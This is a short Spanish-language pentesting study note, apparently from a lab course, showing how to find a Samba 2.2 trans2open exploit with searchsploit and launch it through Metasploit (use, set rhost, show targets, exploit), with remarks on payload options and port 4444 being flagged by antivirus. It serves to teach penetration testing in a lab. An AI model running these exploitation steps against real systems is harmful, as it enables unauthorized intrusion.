# 3 - First Explotation

Hype

Recordando las notas vimos que teniamos un objetivo con SAMBA 2.2 

Buscamos eso con

```text
$ searchexploit samba 2.2    
```

![](../../../.gitbook/assets/imagen%20%28298%29.png)

Notar como se repite varias veces el "trans2open" eso es buena señal de que tenemos un potencial ataque presente

## Desde **metasploit**

```text
search trans2open
```

![](../../../.gitbook/assets/imagen%20%28295%29.png)

Recordar que vimos que corria linux de fondo asi que tenemos esto

```text
use 1
options 
set rhost ip vulnerable
show targets
exploit //o run pero no es tan fachero
```

![](../../../.gitbook/assets/imagen%20%28294%29.png)

Ahora al correr eso lo intenta pero falla en el proceso. Algo sucede con el payload asi que metasploit nos da una nueva opcion para manejar el mismo payload: **payload options**

![](../../../.gitbook/assets/imagen%20%28296%29.png)

Los 4444 en la vida real son atrapados por antivirus ya que son comunes para este tipo de ataques, para esto no importa mucho.

![](../../../.gitbook/assets/imagen%20%28293%29.png)

![WE WON](../../../.gitbook/assets/imagen%20%28292%29.png)



\*\*\*\*

\*\*\*\*

\*\*\*\*

\*\*\*\*

\*\*\*\*

\*\*\*\*

\*\*\*\*

